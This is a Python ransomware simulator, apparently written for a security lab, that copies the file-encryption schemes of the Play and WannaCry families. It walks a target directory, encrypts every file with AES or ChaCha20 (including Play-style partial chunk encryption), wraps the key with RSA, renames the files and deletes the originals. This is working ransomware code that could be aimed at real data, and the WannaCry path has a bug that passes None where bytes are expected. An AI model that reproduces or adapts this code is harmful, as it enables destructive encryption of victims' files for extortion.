import os
import json
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

# Directory to encrypt
directory = r"D:\Cyber\Malware\Ransomware_Simulator\Ransim"

# Exclusions: Do not encrypt these files
exclusions = [
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\public_key.pem",
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\private_key.pem",
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\script.py",
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\descript.py",
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\requirements.txt",
    r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\ransomware_config.json"
]

# Function to list all files in a directory, excluding specific files
def list_files(dir_path, exclusions):
    file_list = []
    for root, _, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path not in exclusions:
                file_list.append(file_path)
    return file_list

# Generate AES key
def generate_aes_key():
    return get_random_bytes(32)  # AES-256 key

# Encrypt file with AES
def encrypt_file_aes(file_path, aes_key, mode='full'):
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    
    if mode == 'full':
        cipher_aes = AES.new(aes_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(plaintext)
        return cipher_aes.nonce + tag + ciphertext
    
    elif mode == 'partial':
        file_size = len(plaintext)
        
        if file_size <= 0x3fffffff:  # Up to 1 GB
            num_chunks = 2
        elif file_size <= 0x27fffffff:  # Up to 10 GB
            num_chunks = 3
        else:  # Greater than 10 GB
            num_chunks = 5

        chunk_size = 64 * 1024  # 64 KB
        encrypted_data = bytearray()
        
        for i in range(num_chunks):
            start = i * chunk_size
            end = min(start + chunk_size, file_size)
            
            cipher_aes = AES.new(aes_key, AES.MODE_EAX)
            chunk, tag = cipher_aes.encrypt_and_digest(plaintext[start:end])
            encrypted_data.extend(cipher_aes.nonce + tag + chunk)
        
        # Include unencrypted remainder of the file
        encrypted_data.extend(plaintext[num_chunks * chunk_size:])
        return bytes(encrypted_data)

# Encrypt file with ChaCha20
def encrypt_file_chacha(file_path, public_key_path):
    with open(public_key_path, "rb") as key_file:
        public_key = serialization.load_pem_public_key(key_file.read())

    key = ChaCha20Poly1305.generate_key()
    nonce = os.urandom(12)
    cipher = ChaCha20Poly1305(key)

    with open(file_path, "rb") as f:
        data = f.read()

    encrypted_data = cipher.encrypt(nonce, data, None)

    encrypted_key = public_key.encrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(file_path + ".locked", "wb") as f:
        f.write(nonce + encrypted_key + encrypted_data)

# Function to generate and save RSA keys
def generate_rsa_keys(public_key_path, private_key_path):
    key = RSA.generate(2048)
    
    private_key = key.export_key()
    with open(private_key_path, 'wb') as f:
        f.write(private_key)
    
    public_key = key.publickey().export_key()
    with open(public_key_path, 'wb') as f:
        f.write(public_key)
    
# Paths to save RSA keys
public_key_path = r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\public_key.pem"
private_key_path = r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\private_key.pem"

# Generate RSA keys
generate_rsa_keys(public_key_path, private_key_path)

# Encrypt AES key using RSA
def encrypt_aes_key_rsa(aes_key, public_key_path):
    with open(public_key_path, 'rb') as f:
        public_key = RSA.import_key(f.read())
    
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_aes_key = cipher_rsa.encrypt(aes_key)
    
    return encrypted_aes_key

# Encrypt all files based on configuration
def encrypt_all_files(ransomware, enc_type, settings, public_key_path):
    files = list_files(directory, exclusions)
    aes_key = generate_aes_key()
    encrypted_aes_key = encrypt_aes_key_rsa(aes_key, public_key_path)

    for file_path in files:
        if ransomware == 'Play':
            encrypted_data = encrypt_file_aes(file_path, aes_key, enc_type)
        elif ransomware == 'Wannacry':
            encrypted_data = encrypt_file_chacha(file_path, public_key_path)
        else:
            continue
        
        encrypted_file_path = file_path + settings['extension']
        with open(encrypted_file_path, 'wb') as f:
            f.write(encrypted_aes_key + encrypted_data)
        os.remove(file_path)  # Optionally delete the original file

# Main function to load JSON and execute encryption
def main():
    try:
        with open("ransomware_config.json", "r") as config_file:
            config = json.load(config_file)
        
        print("Available Ransomware Configurations:")
        for i, ransomware in enumerate(config.keys(), 1):
            print(f"{i}. {ransomware}")

        choice = int(input("Select the ransomware to simulate (enter the number): "))
        selected_ransomware = list(config.keys())[choice - 1]
        selected_settings = config[selected_ransomware]

        # If multiple encryption types are available, ask the user to choose
        if len(selected_settings['encryption_type']) > 1:
            print(f"Available encryption types for {selected_ransomware}:")
            for i, enc_type in enumerate(selected_settings['encryption_type'], 1):
                print(f"{i}. {enc_type.capitalize()}")
            enc_choice = int(input("Select the encryption type (enter the number): "))
            selected_enc_type = selected_settings['encryption_type'][enc_choice - 1]
        else:
            selected_enc_type = selected_settings['encryption_type'][0]
            print(f"Using default encryption type: {selected_enc_type.capitalize()}")

        encrypt_all_files(selected_ransomware, selected_enc_type, selected_settings, public_key_path)
        print(f"Encryption completed using {selected_ransomware} with {selected_enc_type.capitalize()} encryption.")
    except ValueError:
        print("Invalid input. Please enter a number.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
